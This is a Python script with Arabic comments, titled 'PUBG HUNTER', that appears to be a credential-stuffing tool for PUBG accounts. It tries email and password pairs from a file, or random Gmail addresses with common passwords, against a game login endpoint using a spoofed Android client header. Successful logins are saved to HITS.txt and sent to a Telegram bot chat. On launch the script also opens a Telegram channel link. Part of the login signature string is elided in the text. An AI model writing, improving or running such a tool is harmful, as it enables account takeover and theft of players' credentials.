print('اهلا بك في اداه محمد @VFX_l')
import requests
import hashlib
import random
import string
import time
import sys
import webbrowser
from cfonts import render

# فتح قناة تليجرام
webbrowser.open('https://t.me/+IWyexFsTrx40ZWMy')

# ألوان
R = '\x1b[1;31m'
Y = '\x1b[1;33m'
G = '\x1b[1;32m'
B = '\x1b[1;34m'
P = '\x1b[1;35m'

# عنوان الأداة
output = render('PUBG HUNTER', colors=['cyan', 'yellow'], align='center')
print(output)

# طباعة بطيئة
def slow(text): 
    for c in text: sys.stdout.write(c); sys.stdout.flush(); time.sleep(0.002)

# إدخال التوكن وID للتليجرام
print(P + "[!] أدخل معلومات التليجرام لإرسال الحسابات المصيدة:")
tg_token = input(B + '[01] Telegram Bot Token: ')
tg_id = input(B + '[02] Telegram Chat ID: ')
print(P + "[+] تم حفظ البيانات.\n")

# كلمات مرور أكثر قوة وانتشار
passwords = [
    'pubg@123', 'pubg2023', 'pubg@2024', 'playerunknown', '12345678',
    '123456789', '1122334455', 'qwerty123', '987654321', 'password123',
    'pubglover1', 'pubgking12', '123pubg321', 'hello12345'
]

# توليد إيميل عشوائي
def generate_email():
    chars = string.ascii_lowercase + string.digits
    name = ''.join(random.choices(chars, k=random.randint(6, 10)))
    prefix = ''.join(random.choices(chars, k=3))
    return f"{prefix}{name}@gmail.com"

# إرسال إلى تليجرام
def send_to_telegram(email, password):
    try:
        msg = f"PUBG HUNTER\n\n[+] Hit Found!\nEmail: {email}\nPass: {password}"
        url = f"https://api.telegram.org/bot{tg_token}/sendMessage"
        data = {"chat_id": tg_id, "text": msg}
        requests.post(url, data=data)
    except Exception as e:
        print(R + f"[!] Telegram Error: {str(e)}")

# فحص حساب واحد
def check_account(email, password):
    try:
        payload = f'/account/login?..."{email}...{password}..."...'
        sig = hashlib.md5(payload.encode()).hexdigest()
        url = f'https://igame.msdkpass.com/account/login?...&sig={sig}'
        
        headers = {
            'Content-Type': 'application/json; charset=utf-8',
            'User-Agent': 'Dalvik/2.1.0 (Linux; Android 10; PUBG)',
            'Connection': 'Keep-Alive'
        }

        data = {
            'account': email,
            'account_type': 1,
            'area_code': '',
            'extra_json': '',
            'password': password
        }

        res = requests.post(url, headers=headers, json=data)

        if '"token"' in res.text:
            print(G + f'[+] Hit: {email} | {password}')
            with open('HITS.txt', 'a') as f:
                f.write(f'{email}:{password}\n')
            send_to_telegram(email, password)
        else:
            print(R + f'[-] Bad : {email} | {password}')
    except Exception as e:
        print(Y + f'[!] Error: {str(e)}')

# فحص ملف F.txt
def check_list():
    try:
        with open('F.txt', 'r') as f:
            for line in f:
                if ':' in line:
                    email, password = line.strip().split(':')
                    check_account(email, password)
    except FileNotFoundError:
        print(R + '[!] ملف F.txt غير موجود.')

# توليد حسابات وفحصها تلقائيًا
def auto_generate_and_check():
    print(Y + '[*] جاري التوليد والفحص التلقائي...')
    while True:
        email = generate_email()
        password = random.choice(passwords)
        check_account(email, password)
        time.sleep(1)

# القائمة الرئيسية
def main_menu():
    slow(B + '\n[01] فحص السته من ملف F.txt\n[02] سحب ستة حقيقية تلقائيًا\n')
    choice = input(P + 'اختر خيارك: ')
    if choice == '1':
        check_list()
    elif choice == '2':
        auto_generate_and_check()
    else:
        print(R + '[!] خيار غير صالح.')

# تشغيل القائمة
main_menu()